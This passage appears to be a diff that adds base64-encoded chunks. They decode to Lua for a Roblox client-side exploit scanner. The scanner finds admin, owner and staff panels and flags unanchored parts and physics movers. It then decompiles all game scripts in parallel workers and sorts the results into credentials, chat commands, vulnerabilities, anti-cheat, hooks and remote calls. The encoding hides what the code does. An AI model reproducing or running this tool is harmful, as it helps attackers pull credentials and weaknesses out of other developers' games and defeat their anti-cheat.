+'bG9jYWwgbm0gPSAoaW5zdC5OYW1lIG9yICIiKTpsb3dlcigpCiAgICAgICAgICAgICAgICBsb2NhbCBva0MsIGNoID0gcGNhbGwoZnVuY3Rpb24oKSByZXR1',
+'cm4gaW5zdDpHZXRDaGlsZHJlbigpIGVuZCkKICAgICAgICAgICAgICAgIGlmIG9rQyBhbmQgY2ggdGhlbgogICAgICAgICAgICAgICAgICAgIGZvciBfLCBj',
+'IGluIGlwYWlycyhjaCkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgY24gPSBjLkNsYXNzTmFtZQogICAgICAgICAgICAgICAgICAgICAgICBp',
+'ZiBjbiA9PSAiVGV4dEJveCIgdGhlbiB0YiA9IHRydWUgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNuID09ICJUZXh0QnV0dG9uIiBvciBjbiA9',
+'PSAiSW1hZ2VCdXR0b24iIHRoZW4gYnQgPSB0cnVlIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAg',
+'ICAgICBpZiB0YiBhbmQgYnQgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGZsID0ge30KICAgICAgICAgICAgICAgICAgICBpZiBva1YgYW5kIG5v',
+'dCB2aXMgdGhlbiBmbFsjZmwrMV0gPSAiSGlkZGVuIiBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBubTpmaW5kKCJhZG1pbiIpIG9yIG5tOmZpbmQoInBh',
+'bmVsIikgb3Igbm06ZmluZCgib3duZXIiKSBvciBubTpmaW5kKCJkZWJ1ZyIpIG9yIG5tOmZpbmQoInN0YWZmIikgb3Igbm06ZmluZCgibW9kIikgb3Igbm06',
+'ZmluZCgiY29udHJvbCIpIHRoZW4gZmxbI2ZsKzFdID0gIk5hbWU6IiAuLiBpbnN0Lk5hbWUgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgI2ZsID4gMCB0',
+'aGVuIHIuYWRtaW5QYW5lbHNbI3IuYWRtaW5QYW5lbHMrMV0gPSBzdHJpbmcuZm9ybWF0KCJbJXNdICVzICglcykiLCBjbHMsIGZ1bGxQYXRoKGluc3QpLCB0',
+'YWJsZS5jb25jYXQoZmwsICIsICIpKSBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlaWYgY2xzID09ICJJbWFnZUJ1dHRvbiIgb3Ig',
+'Y2xzID09ICJUZXh0QnV0dG9uIiB0aGVuCiAgICAgICAgICAgICAgICByLmJ1dHRvbnNbI3IuYnV0dG9ucysxXSA9IHN0cmluZy5mb3JtYXQoIlslc10gJXMi',
+'LCBjbHMsIGZ1bGxQYXRoKGluc3QpKQogICAgICAgICAgICBlbHNlaWYgUEFSVF9DTEFTU0VTW2Nsc10gdGhlbgogICAgICAgICAgICAgICAgci5wYXJ0cyA9',
+'IHIucGFydHMgKyAxCiAgICAgICAgICAgICAgICBsb2NhbCBva0EsIGFuYyA9IHBjYWxsKGZ1bmN0aW9uKCkgcmV0dXJuIGluc3QuQW5jaG9yZWQgZW5kKQog',
+'ICAgICAgICAgICAgICAgaWYgb2tBIGFuZCBub3QgYW5jIHRoZW4KICAgICAgICAgICAgICAgICAgICByLnVuYW5jaG9yZWQgPSByLnVuYW5jaG9yZWQgKyAx',
+'CiAgICAgICAgICAgICAgICAgICAgaWYgci51bmFuY2hvcmVkIDw9IDMwIHRoZW4gci5uZXR3b3JrQXVkaXRbI3IubmV0d29ya0F1ZGl0KzFdID0gc3RyaW5n',
+'LmZvcm1hdCgiVW5hbmNob3JlZDogJXMiLCBmdWxsUGF0aChpbnN0KSkgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGZvciBfLCBi',
+'bSBpbiBpcGFpcnMoeyAiQm9keVZlbG9jaXR5IiwgIkJvZHlQb3NpdGlvbiIsICJCb2R5Rm9yY2UiLCAiQm9keUd5cm8iLCAiQm9keVRocnVzdCIsICJSb2Nr',
+'ZXRQcm9wdWxzaW9uIiB9KSBkbwogICAgICAgICAgICAgICAgICAgIGxvY2FsIG9rQiwgYmMgPSBwY2FsbChmdW5jdGlvbigpIHJldHVybiBpbnN0OkZpbmRG',
+'aXJzdENoaWxkT2ZDbGFzcyhibSkgZW5kKQogICAgICAgICAgICAgICAgICAgIGlmIG9rQiBhbmQgYmMgdGhlbiByLm5ldHdvcmtBdWRpdFsjci5uZXR3b3Jr',
+'QXVkaXQrMV0gPSBzdHJpbmcuZm9ybWF0KCIlcyBvbjogJXMiLCBibSwgZnVsbFBhdGgoaW5zdCkpIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAg',
+'ICAgIGVsc2VpZiBjbHMgPT0gIkZvbGRlciIgdGhlbgogICAgICAgICAgICAgICAgci5mb2xkZXJzID0gci5mb2xkZXJzICsgMQogICAgICAgICAgICBlbHNl',
+'aWYgY2xzID09ICJNb2RlbCIgdGhlbgogICAgICAgICAgICAgICAgci5tb2RlbHMgPSByLm1vZGVscyArIDEKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5k',
+'CgogICAgICAgIGxvY2FsIG9rQywga2lkcyA9IHBjYWxsKGluc3QuR2V0Q2hpbGRyZW4sIGluc3QpCiAgICAgICAgaWYgb2tDIGFuZCBraWRzIHRoZW4KICAg',
+'ICAgICAgICAgaWYgaW5zdCA9PSBnYW1lIHRoZW4KICAgICAgICAgICAgICAgIGZvciBfLCBjIGluIGlwYWlycyhraWRzKSBkbwogICAgICAgICAgICAgICAg',
+'ICAgIGlmIG5vdCBST0JMT1hfSU5URVJOQUxfS0VZV09SRFNbYy5OYW1lXSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHF1ZXVlWyNxdWV1ZSsxXSA9',
+'IGMKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBmb3IgXywgYyBp',
+'biBpcGFpcnMoa2lkcykgZG8KICAgICAgICAgICAgICAgICAgICBxdWV1ZVsjcXVldWUrMV0gPSBjCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAg',
+'ZW5kCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBpZiBzY2FuQWJvcnRlZCB0aGVuIHJldHVybiBuaWwgZW5kCgogICAgLS0gUGhhc2UgMjogRGVjb21waWxl',
+'IGFsbCBjb2xsZWN0ZWQgc2NyaXB0cyAocGFyYWxsZWwgKyBjYWNoZSkKICAgIGxvY2FsIGRlY29tcGlsZUNhY2hlID0ge30KICAgIGxvY2FsIEJVUlNUX1RJ',
+'TUUgPSBsb3dEZXZpY2VNb2RlIGFuZCAyIG9yIDMKICAgIGxvY2FsIFdBSVRfVElNRSA9IGxvd0RldmljZU1vZGUgYW5kIDEgb3IgMAogICAgbG9jYWwgTlVN',
+'X1dPUktFUlMgPSA2CiAgICBsb2NhbCB3b3JrZXJSZXN1bHRzID0ge30KICAgIGxvY2FsIHdvcmtlcnNEb25lID0gMAogICAgbG9jYWwgc2NyaXB0c1Byb2Nl',
+'c3NlZCA9IDAKICAgIGxvY2FsIHRvdGFsU2NyaXB0cyA9ICNzY1F1ZXVlCiAgICBpZiB0b3RhbFNjcmlwdHMgPT0gMCB0aGVuCiAgICAgICAgaWYgcHJvZ2Z1',
+'bmMgdGhlbiBwcm9nZnVuYygiTm8gc2NyaXB0cyBmb3VuZCB0byBkZWNvbXBpbGUiLCAid2FybiIpIGVsc2VpZiBfX3Byb2cgdGhlbiBfX3Byb2coIk5vIHNj',
+'cmlwdHMgZm91bmQgdG8gZGVjb21waWxlIiwgIndhcm4iKSBlbmQKICAgIGVsc2UKICAgICAgICBpZiBwcm9nZnVuYyB0aGVuIHByb2dmdW5jKHN0cmluZy5m',
+'b3JtYXQoIkRlY29tcGlsaW5nICVkIHNjcmlwdHMgKCVkIHdvcmtlcnMpLi4uIiwgdG90YWxTY3JpcHRzLCBOVU1fV09SS0VSUyksICJkZWNvbXBpbGUiKSBl',
+'bHNlaWYgX19wcm9nIHRoZW4gX19wcm9nKHN0cmluZy5mb3JtYXQoIkRlY29tcGlsaW5nICVkIHNjcmlwdHMgKCVkIHdvcmtlcnMpLi4uIiwgdG90YWxTY3Jp',
+'cHRzLCBOVU1fV09SS0VSUyksICJkZWNvbXBpbGUiKSBlbmQKCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gd29ya2VyVGhyZWFkKHN0YXJ0SWR4KQogICAgICAg',
+'ICAgICBsb2NhbCBvaywgcmVzID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCB3ZGF0YSA9IHsKICAgICAgICAgICAgICAgIGNyZWRzID0g',
+'e30sIGNoYXRDbWRzID0ge30sIHZ1bG5zID0ge30sIGV4dENvbm5zID0ge30sIGFzc2V0Q3R4ID0ge30sCiAgICAgICAgICAgICAgICBhbnRpQ2hlYXQgPSB7',
+'fSwgb2JmdXNjYXRpb24gPSB7fSwgaG9va3MgPSB7fSwgc2NyaXB0cyA9IHt9LAogICAgICAgICAgICAgICAgYXNzZXRJRHMgPSB7fSwgZ2FtZXBhc3NJRHMg',
+'PSB7fSwgZGV2cHJvZElEcyA9IHt9LCBiYWRnZUlEcyA9IHt9LAogICAgICAgICAgICAgICAgc2VydmljZXNGb3VuZCA9IHt9LCByZW1vdGVDcmVhdGlvbnMg',
+'PSB7fSwgc2hhcmVkVmFycyA9IHt9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgbG9jYWwgaSA9IHN0YXJ0SWR4CiAgICAgICAgICAgIHdoaWxlIGkgPD0g',
+'dG90YWxTY3JpcHRzIGRvCiAgICAgICAgICAgICAgICBpZiBzY2FuQWJvcnRlZCB0aGVuIHJldHVybiB3ZGF0YSBlbmQKICAgICAgICAgICAgICAgIGxvY2Fs',
+'IGVudHJ5ID0gc2NRdWV1ZVtpXQogICAgICAgICAgICAgICAgbG9jYWwgaW5zdCwgcGF0aCA9IGVudHJ5Lmluc3QsIGVudHJ5LnBhdGgKICAgICAgICAgICAg',
+'ICAgIGxvY2FsIG1ldGhvZCwgc3JjID0gdHJ5RGVjb21waWxlKGluc3QpCiAgICAgICAgICAgICAgICBsb2NhbCB0YWdzID0ge30KICAgICAgICAgICAgICAg',
+'IGxvY2FsIHJlbW90ZUNhbGxzID0ge30KICAgICAgICAgICAgICAgIGxvY2FsIHJlcXVpcmVzID0ge30KICAgICAgICAgICAgICAgIGxvY2FsIGEgPSB7fQog',
+'ICAgICAgICAgICAgICAgbG9jYWwgZGVlcHMgPSB7IGNyZWRzID0ge30sIGNoYXRDbWRzID0ge30sIHZ1bG5zID0ge30sIGV4dENvbm5zID0ge30sIGFzc2V0',
+'Q3R4ID0ge30sIGFudGlDaGVhdCA9IHt9LCBvYmZ1c2NhdGlvbiA9IHt9LCBob29rcyA9IHt9IH0KCiAgICAgICAgICAgICAgICBpZiBzcmMgYW5kICNzcmMg',
+'PiAwIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBjYWNoZUtleSA9ICNzcmMgLi4gIjoiIC4uIHNyYzpzdWIoMSwgbWF0aC5taW4oMTUwLCAjc3Jj',
+'KSkKICAgICAgICAgICAgICAgICAgICBsb2NhbCBjYWNoZWQgPSBkZWNvbXBpbGVDYWNoZVtjYWNoZUtleV0KICAgICAgICAgICAgICAgICAgICBpZiBjYWNo',
+'ZWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBhID0gY2FjaGVkLmEKICAgICAgICAgICAgICAgICAgICAgICAgZGVlcHMgPSBjYWNoZWQuZGVlcHMK',
+'ICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHQgaW4gaXBhaXJzKGNhY2hlZC50YWdzKSBkbyB0YWdzWyN0YWdzKzFdID0gdCBlbmQKICAgICAgICAg',
+'ICAgICAgICAgICAgICAgZm9yIF8sIHJjIGluIGlwYWlycyhjYWNoZWQucmVtb3RlQ2FsbHMpIGRvIHJlbW90ZUNhbGxzWyNyZW1vdGVDYWxscysxXSA9IHJj',
+'IGVuZAogICAgICAgICAgICAgICAgICAgICAgICBmb3IgaywgdiBpbiBwYWlycyhjYWNoZWQucmVxdWlyZXMpIGRvIHJlcXVpcmVzW2tdID0gdiBlbmQKICAg',
+'ICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIGEgPSBhbmFseXplU291cmNlKHNyYykKICAgICAgICAgICAgICAgICAgICAg',
+'ICAgaWYgbm90IHNraXBTbWFsbFNjcmlwdHMgb3IgI3NyYyA+PSAyMDAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVlcHMgPSBkZWVwQW5h',
+'bHl6ZShzcmMpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBmb3IgayBpbiBwYWlycyhhLmtleXdvcmRzKSBk',
+'byB0YWdzWyN0YWdzKzFdID0gayBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGsgaW4gcGFpcnMoYS5saWJyYXJpZXMpIGRvIHRhZ3NbI3RhZ3Mr',
+'MV0gPSBrIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBmb3IgayBpbiBwYWlycyhhLnRhZ3MpIGRvIHRhZ3NbI3RhZ3MrMV0gPSBrIGVuZAogICAgICAg',
+'ICAgICAgICAgICAgICAgICBmb3IgXywgcmMgaW4gaXBhaXJzKGEucmVtb3RlcykgZG8gcmVtb3RlQ2FsbHNbI3JlbW90ZUNhbGxzKzFdID0gcmMgZW5kCiAg',
+'ICAgICAgICAgICAgICAgICAgICAgIGZvciBrIGluIHBhaXJzKGEucmVxdWlyZXMpIGRvIHJlcXVpcmVzW2tdID0gdHJ1ZSBlbmQKICAgICAgICAgICAgICAg',
+'ICAgICAgICAgZGVjb21waWxlQ2FjaGVbY2FjaGVLZXldID0geyBhID0gYSwgZGVlcHMgPSBkZWVwcywgdGFncyA9IHRhZ3MsIHJlbW90ZUNhbGxzID0gcmVt',
+'b3RlQ2FsbHMsIHJlcXVpcmVzID0gcmVxdWlyZXMgfQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAg',
+'ICAgd2RhdGEuc2NyaXB0c1tpXSA9IHsgdCA9IGluc3QuQ2xhc3NOYW1lLCBwYXRoID0gcGF0aCwgbWV0aG9kID0gbWV0aG9kIG9yICJub25lIiwgc3JjID0g',
+'c3JjLCB0YWdzID0gdGFncywgcmVtb3RlQ2FsbHMgPSByZW1vdGVDYWxscywgcmVxdWlyZXMgPSByZXF1aXJlcywgZHluYW1pY1JlbW90ZSA9IGEuZHluYW1p',
+'Y1JlbW90ZSwgaXNDb25maWcgPSBhLmlzQ29uZmlnLCBjcmVkcyA9IGRlZXBzLmNyZWRzLCBjaGF0Q21kcyA9IGRlZXBzLmNoYXRDbWRzLCBleHRDb25ucyA9',
+'IGRlZXBzLmV4dENvbm5zLCB2dWxucyA9IGRlZXBzLnZ1bG5zLCByZW1vdGVDcmVhdGlvbnMgPSBhLnJlbW90ZUNyZWF0aW9ucyBvciB7fSwgc2hhcmVkVmFy',
+'cyA9IGEuc2hhcmVkVmFycyBvciB7fSB9CgogICAgICAgICAgICAgICAgaWYgc3JjIGFuZCAjc3JjID4gMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9y',
+'IGsgaW4gcGFpcnMoYS5hc3NldHMpIGRvIHdkYXRhLmFzc2V0SURzW2tdID0gdHJ1ZSBlbmQKICAgICAgICAgICAgICAgICAgICBmb3IgayBpbiBwYWlycyhh',
+'LmdhbWVwYXNzKSBkbyB3ZGF0YS5nYW1lcGFzc0lEc1trXSA9IHRydWUgZW5kCiAgICAgICAgICAgICAgICAgICAgZm9yIGsgaW4gcGFpcnMoYS5kZXZwcm9k',
+'KSBkbyB3ZGF0YS5kZXZwcm9kSURzW2tdID0gdHJ1ZSBlbmQKICAgICAgICAgICAgICAgICAgICBmb3IgayBpbiBwYWlycyhhLmJhZGdlKSBkbyB3ZGF0YS5i',
+'YWRnZUlEc1trXSA9IHRydWUgZW5kCiAgICAgICAgICAgICAgICAgICAgZm9yIGsgaW4gcGFpcnMoYS5zZXJ2aWNlcykgZG8gd2RhdGEuc2VydmljZXNGb3Vu',
+'ZFtrXSA9IHRydWUgZW5kCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gaXBhaXJzKGRlZXBzLmNyZWRzKSBkbyB3ZGF0YS5jcmVkc1sjd2RhdGEu',
+'Y3JlZHMrMV0gPSB2IGVuZAogICAgICAgICAgICAgICAgICAgIGZvciBfLCB2IGluIGlwYWlycyhkZWVwcy5jaGF0Q21kcykgZG8gd2RhdGEuY2hhdENtZHNb',
+'I3dkYXRhLmNoYXRDbWRzKzFdID0gdiBlbmQKICAgICAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBpcGFpcnMoZGVlcHMuZXh0Q29ubnMpIGRvIHdkYXRh',
+'LmV4dENvbm5zWyN3ZGF0YS5leHRDb25ucysxXSA9IHYgZW5kCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gaXBhaXJzKGRlZXBzLmFzc2V0Q3R4',
+'KSBkbyB3ZGF0YS5hc3NldEN0eFsjd2RhdGEuYXNzZXRDdHgrMV0gPSB2IGVuZAogICAgICAgICAgICAgICAgICAgIGZvciBfLCB2IGluIGlwYWlycyhkZWVw',
+'cy5hbnRpQ2hlYXQpIGRvIHdkYXRhLmFudGlDaGVhdFsjd2RhdGEuYW50aUNoZWF0KzFdID0gdiBlbmQKICAgICAgICAgICAgICAgICAgICBmb3IgXywgdiBp',
+'biBpcGFpcnMoZGVlcHMub2JmdXNjYXRpb24pIGRvIHdkYXRhLm9iZnVzY2F0aW9uWyN3ZGF0YS5vYmZ1c2NhdGlvbisxXSA9IHYgZW5kCiAgICAgICAgICAg',
+'ICAgICAgICAgZm9yIF8sIHYgaW4gaXBhaXJzKGRlZXBzLmhvb2tzKSBkbyB3ZGF0YS5ob29rc1sjd2RhdGEuaG9va3MrMV0gPSB2IGVuZAogICAgICAgICAg',
+'ICAgICAgICAgIGZvciBfLCB2IGluIGlwYWlycyhkZWVwcy52dWxucykgZG8gdi5wYXRoID0gcGF0aDsgd2RhdGEudnVsbnNbI3dkYXRhLnZ1bG5zKzFdID0g',
+'diBlbmQKICAgICAgICAgICAgICAgICAgICBmb3IgXywgcmMgaW4gaXBhaXJzKGEucmVtb3RlQ3JlYXRpb25zKSBkbyB3ZGF0YS5yZW1vdGVDcmVhdGlvbnNb',
+'I3dkYXRhLnJlbW90ZUNyZWF0aW9ucysxXSA9IHJjIGVuZAogICAgICAgICAgICAgICAgICAgIGZvciBfLCBzdiBpbiBpcGFpcnMoYS5zaGFyZWRWYXJzKSBk',
+'byB3ZGF0YS5zaGFyZWRWYXJzWyN3ZGF0YS5zaGFyZWRWYXJzKzFdID0geyB2YXIgPSBzdi52YXIsIHR5cGUgPSBzdi50eXBlLCBzbmlwcGV0ID0gc3Yuc25p',
+'cHBldCB9IGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBzY3JpcHRzUHJvY2Vzc2VkID0gc2NyaXB0c1Byb2Nlc3NlZCArIDEKICAg',
+'ICAgICAgICAgICAgIGkgPSBpICsgTlVNX1dPUktFUlMKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHJldHVybiB3ZGF0YQogICAgICAgICAgICBlbmQp',
+'CiAgICAgICAgICAgIGlmIG9rIHRoZW4KICAgICAgICAgICAgICAgIHdvcmtlclJlc3VsdHNbc3RhcnRJZHhdID0gcmVzCiAgICAgICAgICAgIGVsc2UKICAg',
+'ICAgICAgICAgICAgIHdvcmtlclJlc3VsdHNbc3RhcnRJZHhdID0gewogICAgICAgICAgICAgICAgICAgIGNyZWRzID0ge30sIGNoYXRDbWRzID0ge30sIHZ1',
+'bG5zID0ge30sIGV4dENvbm5zID0ge30sIGFzc2V0Q3R4ID0ge30sCiAgICAgICAgICAgICAgICAgICAgYW50aUNoZWF0ID0ge30sIG9iZnVzY2F0aW9uID0g',
+'e30sIGhvb2tzID0ge30sIHNjcmlwdHMgPSB7fSwKICAgICAgICAgICAgICAgICAgICBhc3NldElEcyA9IHt9LCBnYW1lcGFzc0lEcyA9IHt9LCBkZXZwcm9k',
+'SURzID0ge30sIGJhZGdlSURzID0ge30sCiAgICAgICAgICAgICAgICAgICAgc2VydmljZXNGb3VuZCA9IHt9LCByZW1vdGVDcmVhdGlvbnMgPSB7fSwgc2hh',
+'cmVkVmFycyA9IHt9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBzcGF3bkNvdW50ID0gbWF0',
+'aC5taW4oTlVNX1dPUktFUlMsIHRvdGFsU2NyaXB0cykKICAgICAgICBmb3IgdyA9IDEsIHNwYXduQ291bnQgZG8KICAgICAgICAgICAgdGFzay5zcGF3bih3',
+'b3JrZXJUaHJlYWQsIHcpCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIGJ1cnN0U3RhcnQgPSBvcy5jbG9jaygpCiAgICAgICAgbG9jYWwgd2FpdGluZyA9',
+'IGZhbHNlCiAgICAgICAgbG9jYWwgZ2NUaW1lciA9IDAKICAgICAgICBsb2NhbCBsYXN0UHJvZ3Jlc3MgPSAwCiAgICAgICAgd2hpbGUgd29ya2Vyc0RvbmUg',
+'PCBzcGF3bkNvdW50IGRvCiAgICAgICAgICAgIGlmIHNjYW5BYm9ydGVkIHRoZW4gcmV0dXJuIG5pbCBlbmQKICAgICAgICAgICAgaWYgd2FpdGluZyB0aGVu',
+'CiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMCkKICAgICAgICAgICAgICAgIGlmIG9zLmNsb2NrKCkgLSBidXJzdFN0YXJ0ID49IFdBSVRfVElNRSB0aGVu',
+'CiAgICAgICAgICAgICAgICAgICAgd2FpdGluZyA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgYnVyc3RTdGFydCA9IG9zLmNsb2NrKCkKICAgICAgICAg',
+'ICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBmb3IgdyA9IDEsIHNwYXduQ291bnQgZG8KICAgICAgICAgICAgICAgICAgICBs',
+'b2NhbCB3ciA9IHdvcmtlclJlc3VsdHNbd10KICAgICAgICAgICAgICAgICAgICBpZiB3ciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHdvcmtlclJl',
+'c3VsdHNbd10gPSBuaWwKICAgICAgICAgICAgICAgICAgICAgICAgd29ya2Vyc0RvbmUgPSB3b3JrZXJzRG9uZSArIDEKICAgICAgICAgICAgICAgICAgICAg',
+'ICAgZm9yIHNpLCBzIGluIHBhaXJzKHdyLnNjcmlwdHMpIGRvIHIuc2NyaXB0c1sjci5zY3JpcHRzKzFdID0gcyBlbmQKICAgICAgICAgICAgICAgICAgICAg',
+'ICAgZm9yIGsgaW4gcGFpcnMod3IuYXNzZXRJRHMpIGRvIHIuYXNzZXRJRHNba10gPSB0cnVlIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBmb3IgayBp',
+'biBwYWlycyh3ci5nYW1lcGFzc0lEcykgZG8gci5nYW1lcGFzc0lEc1trXSA9IHRydWUgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBrIGluIHBh',
+'aXJzKHdyLmRldnByb2RJRHMpIGRvIHIuZGV2cHJvZElEc1trXSA9IHRydWUgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBrIGluIHBhaXJzKHdy',
+'LmJhZGdlSURzKSBkbyByLmJhZGdlSURzW2tdID0gdHJ1ZSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGsgaW4gcGFpcnMod3Iuc2VydmljZXNG',
+'b3VuZCkgZG8gci5zZXJ2aWNlc0ZvdW5kW2tdID0gdHJ1ZSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gaXBhaXJzKHdyLmNyZWRz',
+'KSBkbyByLmNyZWRzWyNyLmNyZWRzKzFdID0gdiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gaXBhaXJzKHdyLmNoYXRDbWRzKSBk',
+'byByLmNoYXRDbWRzWyNyLmNoYXRDbWRzKzFdID0gdiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gaXBhaXJzKHdyLmV4dENvbm5z',
+'KSBkbyByLmV4dENvbm5zWyNyLmV4dENvbm5zKzFdID0gdiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gaXBhaXJzKHdyLmFzc2V0',
+'Q3R4KSBkbyByLmFzc2V0Q3R4WyNyLmFzc2V0Q3R4KzFdID0gdiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gaXBhaXJzKHdyLmFu',
+'dGlDaGVhdCkgZG8gci5hbnRpQ2hlYXRbI3IuYW50aUNoZWF0KzFdID0gdiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gaXBhaXJz',
+'KHdyLm9iZnVzY2F0aW9uKSBkbyByLm9iZnVzY2F0aW9uWyNyLm9iZnVzY2F0aW9uKzFdID0gdiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8s',
+'IHYgaW4gaXBhaXJzKHdyLmhvb2tzKSBkbyByLmhvb2tzWyNyLmhvb2tzKzFdID0gdiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4g',
+'aXBhaXJzKHdyLnZ1bG5zKSBkbyByLnZ1bG5zWyNyLnZ1bG5zKzFdID0gdiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gaXBhaXJz',
+'KHdyLnJlbW90ZUNyZWF0aW9ucykgZG8gci5yZW1vdGVDcmVhdGlvbnNbI3IucmVtb3RlQ3JlYXRpb25zKzFdID0gdiBlbmQKICAgICAgICAgICAgICAgICAg',
+'ICAgICAgZm9yIF8sIHYgaW4gaXBhaXJzKHdyLnNoYXJlZFZhcnMpIGRvIHIuc2hhcmVkVmFyc1sjci5zaGFyZWRWYXJzKzFdID0gdiBlbmQKICAgICAgICAg',
+'ICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGxvY2FsIHBOb3cgPSBzY3JpcHRzUHJvY2Vzc2VkCiAgICAgICAg',
+'ICAgICAgICBpZiBwTm93IC0gbGFzdFByb2dyZXNzID49IDUgb3IgcE5vdyA9PSB0b3RhbFNjcmlwdHMgdGhlbgogICAgICAgICAgICAgICAgICAgIGxhc3RQ',
+'cm9ncmVzcyA9IHBOb3cKICAgICAgICAgICAgICAgICAgICBpZiBwcm9nZnVuYyB0aGVuIHByb2dmdW5jKHN0cmluZy5mb3JtYXQoIlNjcmlwdCAlZC8lZCAo',
+'JWQgd29ya2VycykiLCBwTm93LCB0b3RhbFNjcmlwdHMsIHNwYXduQ291bnQpLCAic2NyaXB0IikgZWxzZWlmIF9fcHJvZyB0aGVuIF9fcHJvZyhzdHJpbmcu',
+'Zm9ybWF0KCJTY3JpcHQgJWQvJWQgKCVkIHdvcmtlcnMpIiwgcE5vdywgdG90YWxTY3JpcHRzLCBzcGF3bkNvdW50KSwgInNjcmlwdCIpIGVuZAogICAgICAg',
+'ICAgICAgICAgICAgIGlmIHVwZnVuYyB0aGVuIHVwZnVuYyhwTm93LCB0b3RhbFNjcmlwdHMsICJwYXJhbGxlbCIsIG1hdGguZmxvb3IocE5vdyAvIHRvdGFs',
+'U2NyaXB0cyAqIDEwMCksICJkZWNvbXBpbGUiKSBlbHNlaWYgdXBkYXRlUHJvZ3Jlc3MgdGhlbiB1cGRhdGVQcm9ncmVzcyhwTm93LCB0b3RhbFNjcmlwdHMs',
+'ICJwYXJhbGxlbCIsIG1hdGguZmxvb3IocE5vdyAvIHRvdGFsU2NyaXB0cyAqIDEwMCksICJkZWNvbXBpbGUiKSBlbmQKICAgICAgICAgICAgICAgIGVuZAoK',
+'ICAgICAgICAgICAgICAgIGlmIG9zLmNsb2NrKCkgLSBidXJzdFN0YXJ0ID49IEJVUlNUX1RJTUUgdGhlbgogICAgICAgICAgICAgICAgICAgIHdhaXRpbmcg',
+'PSBXQUlUX1RJTUUgPiAwCiAgICAgICAgICAgICAgICAgICAgYnVyc3RTdGFydCA9IG9zLmNsb2NrKCkKICAgICAgICAgICAgICAgICAgICBpZiBsb3dEZXZp',
+'Y2VNb2RlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZ2NUaW1lciA9IGdjVGltZXIgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdjVGlt',
+'ZXIgJSAyID09IDAgdGhlbiBwY2FsbChjb2xsZWN0Z2FyYmFnZSkgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAg',
+'ICAgICAgICAgICAgIGlmIHdvcmtlcnNEb25lIDwgc3Bhd25Db3VudCB0aGVuIHRhc2sud2FpdCgwKSBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5k',
+'CiAgICAgICAgaWYgbG93RGV2aWNlTW9kZSB0aGVuIHBjYWxsKGNvbGxlY3RnYXJiYWdlKSBlbmQKICAgIGVuZAoKICAgIGlmIHByb2dmdW5jIHRoZW4gcHJv',
